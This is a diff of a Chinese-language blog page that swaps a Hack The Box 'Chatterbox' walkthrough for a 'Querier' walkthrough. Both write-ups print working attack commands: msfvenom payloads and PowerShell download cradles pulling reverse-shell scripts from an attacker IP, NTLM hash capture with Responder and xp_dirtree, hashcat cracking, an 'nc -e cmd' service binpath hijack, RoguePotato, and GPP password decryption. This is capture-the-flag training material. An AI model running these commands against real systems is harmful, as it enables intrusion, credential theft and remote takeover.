@@ -21,30 +21,45 @@
   </script>
 
 
-  <meta name="description" content="扫描出一个服务achat，其他没有任何信息">
+  <meta name="description" content="smb枚举还行啦了Reports目录可读">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Chatterbox">
-<meta property="og:url" content="http://evilarsene.icu/2020/06/25/Chatterbox/index.html">
+<meta property="og:title" content="HTB:Querier">
+<meta property="og:url" content="http://evilarsene.icu/2021/05/24/HTB-Querier/index.html">
 <meta property="og:site_name" content="Love ❤ Hacking">
-<meta property="og:description" content="扫描出一个服务achat，其他没有任何信息">
+<meta property="og:description" content="smb枚举还行啦了Reports目录可读">
 <meta property="og:locale">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/1.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/2.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/3.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/4.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/5.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/6.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/7.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/8.jpg">
-<meta property="og:image" content="http://evilarsene.icu/images/chatterbox/9.jpg">
-<meta property="article:published_time" content="2020-06-25T02:19:17.000Z">
-<meta property="article:modified_time" content="2020-06-25T15:34:32.915Z">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/25.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/16.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/20.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/21.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/22.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/23.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Querier/24.png">
+<meta property="article:published_time" content="2021-05-24T14:26:08.000Z">
+<meta property="article:modified_time" content="2021-05-24T15:01:19.027Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Windows靶机">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://evilarsene.icu/images/chatterbox/1.jpg">
+<meta name="twitter:image" content="http://evilarsene.icu/images/Querier/1.png">
 
-<link rel="canonical" href="http://evilarsene.icu/2020/06/25/Chatterbox/">
+<link rel="canonical" href="http://evilarsene.icu/2021/05/24/HTB-Querier/">
 
 
 <script id="page-configurations">
@@ -57,7 +72,7 @@
   };
 </script>
 
-  <title>Chatterbox | Love ❤ Hacking</title>
+  <title>HTB:Querier | Love ❤ Hacking</title>
   
 
 
@@ -202,7 +217,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2020/06/25/Chatterbox/">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2021/05/24/HTB-Querier/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/touxiang.jpg">
@@ -215,7 +230,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Chatterbox
+          HTB:Querier
         </h1>
 
         <div class="post-meta">
@@ -226,7 +241,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-06-25 10:19:17 / 修改时间：23:34:32" itemprop="dateCreated datePublished" datetime="2020-06-25T10:19:17+08:00">2020-06-25</time>
+              <time title="创建时间：2021-05-24 22:26:08 / 修改时间：23:01:19" itemprop="dateCreated datePublished" datetime="2021-05-24T22:26:08+08:00">2021-05-24</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -249,52 +264,95 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Chatterbox"><a href="#Chatterbox" class="headerlink" title="Chatterbox"></a>Chatterbox</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/chatterbox/1.jpg" alt="1"></p>
-<p>扫描出一个服务achat，其他没有任何信息</p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>没什么可以枚举的，直接搜索公开漏洞</p>
-<p><img src="/images/chatterbox/2.jpg" alt="2"></p>
-<p>发现BOF，观察这个漏洞利用代码<img src="/images/chatterbox/3.jpg" alt="3"></p>
-<p>它的buffer最大好像为1152，我们不能超过这个值，并且已经帮我找出了坏字节，这样我们可以生成自己的payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;exec CMD&#x3D;&quot;Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; -e x86&#x2F;unicode_mixed -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister&#x3D;EAX -f python</span><br></pre></td></tr></table></figure>
+        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Querier/1.png" alt="1"></p>
+<p>smb枚举还行啦了<code>Reports</code>目录可读</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb -u anonymous -p anoymous --shares 10.10.10.125 -d localhost</span><br></pre></td></tr></table></figure>
 
-<p>再修改ip地址</p>
-<p><img src="/images/chatterbox/4.jpg" alt="4"></p>
-<p>就能触发我们的invoke-powershell，反弹powershell</p>
-<p><img src="/images/chatterbox/5.jpg" alt="5"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用powerup进行扫描</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;PowerUp.ps1&#39;)</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Querier/2.png" alt="1"></p>
+<p>其中只有一个Excel文件，下载下来</p>
+<p><img src="/images/Querier/3.png" alt="3"></p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>xlsm扩展名表示这个Excel里面有宏脚本，所以我安装<a target="_blank" rel="noopener" href="https://github.com/decalage2/oletools">oletools</a>来读取它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba macro.xlsm</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/chatterbox/6.jpg" alt="6"></p>
-<p>扫出了自动登录的凭证</p>
-<p>开始提权</p>
-<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>存储账号信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;Welcome1!&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;Administrator&#39;, $SecPass)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Querier/4.png" alt="4"></p>
+<p>得到凭据<code>reporting/PcwTWTHRwryjc$c6</code></p>
+<p>除此之外，可以解压xlsm文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> macro.xlsm                                             </span><br><span class="line">macro.xlsm: Microsoft Excel 2007+</span><br><span class="line"></span><br><span class="line"><span class="variable">$unzip</span> macro.xlsm                                      </span><br><span class="line">Archive:  macro.xlsm</span><br><span class="line">  inflating: [Content_Types].xml     </span><br><span class="line">  inflating: _rels/.rels             </span><br><span class="line">  inflating: xl/workbook.xml         </span><br><span class="line">  inflating: xl/_rels/workbook.xml.rels  </span><br><span class="line">  inflating: xl/worksheets/sheet1.xml  </span><br><span class="line">  inflating: xl/theme/theme1.xml     </span><br><span class="line">  inflating: xl/styles.xml           </span><br><span class="line">  inflating: xl/vbaProject.bin       </span><br><span class="line">  inflating: docProps/core.xml       </span><br><span class="line">  inflating: docProps/app.xml</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> xl/vbaProject.bin                                     </span><br><span class="line">xl/vbaProject.bin: Composite Document File V2 Document, Cannot <span class="built_in">read</span> section info</span><br></pre></td></tr></table></figure>
 
-<p>反弹admin的shell<br>注意:这里反弹的Invoke-PowerShellTcp.ps1和之前不能是同一个，而且别忘记了改端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;Invoke-PowerShellTcp2.ps1&#39;)&quot; -Credential $cred</span><br></pre></td></tr></table></figure>
+<p>宏脚本一般存储在vbaProject.bin，可以用strings来提取它的ASCII</p>
+<p><img src="/images/Querier/5.png" alt="5"></p>
+<p>这里凭据不能使用<code>sqsh</code>或者<code>mssql-cli</code>这样的工具连接，但可以通过impacket的<code>mssqlclient.py</code>指定<code>-windows-auth</code>参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py reporting:&#39;PcwTWTHRwryjc$c6&#39;@10.10.10.125 -windows-auth</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/chatterbox/7.jpg" alt="7"></p>
-<p>成功getshell</p>
-<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>发现本地开放了smb服务</p>
-<p><img src="/images/chatterbox/8.jpg" alt="8"></p>
-<p>我们可以以administrator的身份登录smb，执行cmd即可</p>
-<p>先进行端口转发的配置，使用plink</p>
-<p>文件传输</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &#x2F;&#x2F;10.10.16.99&#x2F;a&#x2F;plink.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Querier/6.png" alt="6"></p>
+<p><code>mssqlclient.py</code>可以通过命令打开<code>xp_cmdshell</code>，比较方便，但是这里权限不足</p>
+<p><img src="/images/Querier/7.png" alt="7"></p>
+<p>和<code>HTB:Giddy</code>一样，尝试通过<code>Responder</code>窃取用户的NTLMv2 HASH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/chatterbox/9.jpg" alt="9"></p>
-<p>进行转发</p>
-<p>切记，如果你使用root账户，需要修改默认禁用root进行ssh</p>
-<p>在<code>/etc/ssh/sshd_config</code>中增加一行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure>
+<p>在目标上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree &#39;\\10.10.16.12\hash&#39;</span><br></pre></td></tr></table></figure>
 
-<p>之后再用命令转发即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &quot;&#x2F;c echo y|C:\users\Alfred\plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.16.99&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Querier/8.png" alt="8"></p>
+<p>之前使用john，这次尝试使用hashcat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>
 
-<p>最后使用winexe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winexe -U Administrator &#x2F;&#x2F;127.0.0.1 &quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>得到凭据<code>MSSQL-SVC/corporate568</code></p>
+<p><img src="/images/Querier/9.png" alt="9"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py MSSQL-SVC:&#39;corporate568&#39;@10.10.10.125 -windows-auth</span><br></pre></td></tr></table></figure>
 
-<p>我们就能获取shell</p>
+<p>连接成功，并确认当前用户拥有DBA权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select IS_SRVROLEMEMBER (&#39;sysadmin&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/10.png" alt="10"></p>
+<p>这表示我们可以使用xp_cmdshell了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshellxp_cmdshell whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/11.png" alt="11"></p>
+<p>这里反弹shell注意转义和单双引号，否则容易出现语法问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell Powershell iex(new-object net.webclient).downloadString(\&quot;http:&#x2F;&#x2F;10.10.16.12&#x2F;Invoke-PowerShellTcp.ps1\&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/12.png" alt="12"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>Powerup发现DLL劫持，不过没有机会能够重启该服务</p>
+<p><img src="/images/Querier/25.png" alt="25"></p>
+<h2 id="方法1-Restart-Service-UsoSvc"><a href="#方法1-Restart-Service-UsoSvc" class="headerlink" title="方法1 Restart-Service UsoSvc"></a>方法1 Restart-Service UsoSvc</h2><p>accesschk发现当前用户对服务<code>UsoSvc</code>具有完全控制权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwcqv &quot;service&quot; UsoSvc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/18.png" alt="18"></p>
+<p>修改路径，重启服务即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;C:\Users\Public\Documents\nc.exe 10.10.16.12 5555 -e cmd&quot;Restart-Service UsoSvc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/19.png" alt="19"></p>
+<h2 id="方法2-RouguePotato"><a href="#方法2-RouguePotato" class="headerlink" title="方法2 RouguePotato"></a>方法2 RouguePotato</h2><p>发现用户具有<code>SeImpersonatePrivilege</code></p>
+<p><img src="/images/Querier/14.png" alt="14"></p>
+<p>不过操作系统为<code>Windows Server 2019</code>，这就需要使用RouguePotato</p>
+<p><img src="/images/Querier/15.png" alt="15"></p>
+<p>kali进行端口转发，将欺骗135端口的流量转发到目标的Oxid resolver</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.125:9999</span><br></pre></td></tr></table></figure>
+
+<p>最后在目标机器上执行RoguePotato即可，注意选择合适的CLSID</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\roguepotato.exe -r 10.10.16.12 -e &quot;cmd &#x2F;c powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.12&#x2F;Invoke-PowerShellTcp2.ps1&#39;)&quot; -l 9999 -c &quot;&#123;B91D5831-B1BD-4608-8198-D72E155020F7&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/13.png" alt="13"></p>
+<h2 id="方法3-Group-Policy-Preferences-GPP"><a href="#方法3-Group-Policy-Preferences-GPP" class="headerlink" title="方法3 Group Policy Preferences (GPP)"></a>方法3 Group Policy Preferences (GPP)</h2><p>winpeas可以发现GPP的凭据，并自动对其进行解密</p>
+<p><img src="/images/Querier/16.png" alt="16"></p>
+<p>这篇<a target="_blank" rel="noopener" href="https://www.mindpointgroup.com/blog/pen-test/privilege-escalation-via-group-policy-preferences-gpp/">文章</a>很好描述了漏洞产生的原因</p>
+<p>查看<code>PowerUp.ps1</code>的<code>Get-CachedGPPPassword</code>函数，可以发现其原理。它会去寻找可能存储密码的XML文件，正则提取密码部分，再用微软公开的AES Key解密</p>
+<p><img src="/images/Querier/20.png" alt="20"></p>
+<p>我们可以手动完成枚举和解密。首先寻找文件，比如这里的Groups/xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c &quot;dir &#x2F;s &#x2F;b C: | findstr Groups.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/21.png" alt="21"></p>
+<p>查看内容，提取密码部分</p>
+<p><img src="/images/Querier/22.png" alt="22"></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py">链接</a>进行破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Gpprefdecrypt.py CiDUq6tbrBL1m&#x2F;js9DmZNIydXpsE69WB9JrhwYRW9xywOz1&#x2F;0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/23.png" alt="23"></p>
+<p>得到<code>MyUnclesAreMarioAndLuigi!!1!</code>。之后WinRM或者PTH都行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.125 -u administrator -p &#39;MyUnclesAreMarioAndLuigi!!1!&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Querier/24.png" alt="24"></p>
 
     </div>
 
@@ -313,13 +371,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/06/25/HTB-Sunday/" rel="prev" title="HTB:Sunday">
-      <i class="fa fa-chevron-left"></i> HTB:Sunday
+    <a href="/2021/05/22/HTB-Sauna/" rel="prev" title="HTB:Sauna">
+      <i class="fa fa-chevron-left"></i> HTB:Sauna
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/06/26/HTB-Irked/" rel="next" title="HTB:Irked">
-      HTB:Irked <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -378,7 +433,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Chatterbox"><span class="nav-number">1.</span> <span class="nav-text">Chatterbox</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">端口扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-number">1.3.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-number">1.3.2.</span> <span class="nav-text">方法2</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-Restart-Service-UsoSvc"><span class="nav-number">3.1.</span> <span class="nav-text">方法1 Restart-Service UsoSvc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-RouguePotato"><span class="nav-number">3.2.</span> <span class="nav-text">方法2 RouguePotato</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%953-Group-Policy-Preferences-GPP"><span class="nav-number">3.3.</span> <span class="nav-text">方法3 Group Policy Preferences (GPP)</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -394,7 +449,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">157</span>
+          <span class="site-state-item-count">159</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
